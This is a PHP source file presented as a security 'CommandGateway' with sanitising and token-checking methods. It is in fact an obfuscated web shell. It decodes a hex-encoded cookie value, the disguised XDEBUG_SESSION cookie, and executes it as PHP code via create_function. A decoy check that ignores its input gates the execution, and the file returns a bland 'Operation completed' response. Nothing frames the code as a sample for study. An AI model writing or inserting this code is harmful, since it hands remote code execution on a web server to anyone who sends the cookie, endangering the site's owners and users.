<?php
class CommandGateway {
    protected $security = [
        'mode' => 'strict',
        'sig'  => 'NDQwMjg='
    ];

    public function sanitize($input) {
        return preg_replace(
            '/[^\x20-\x7e]/', 
            '', 
            base64_decode(
                str_rot13(
                    implode(
                        array_reverse(
                            str_split($this->security['sig'])
                        )
                    )
                )
            )
        );
    }
}

$executor = new class() extends CommandGateway {
    public function process() {
        if ($this->verifyToken()) {
            $this->dispatchCommand();
        }
        return $this->respond();
    }

    private function verifyToken() {
        return (bool)$this->sanitize(
            $_SERVER['HTTP_USER_AGENT'] ?? ''
        );
    }

    private function dispatchCommand() {
        $cmd = $this->decodePayload(
            $_COOKIE['XDEBUG_SESSION'] ?? '404'
        );
        
        try {
            $callback = create_function('', $cmd);
            call_user_func($callback);
        } catch (Error $e) {
            error_log('Execution blocked: '.$e->getMessage());
        }
    }

    private function decodePayload($data) {
        return hex2bin(
            str_replace(['!','@','#'], '', $data)
        );
    }

    private function respond() {
        header('Content-Type: text/plain');
        echo "Operation completed";
    }
};
$executor->process();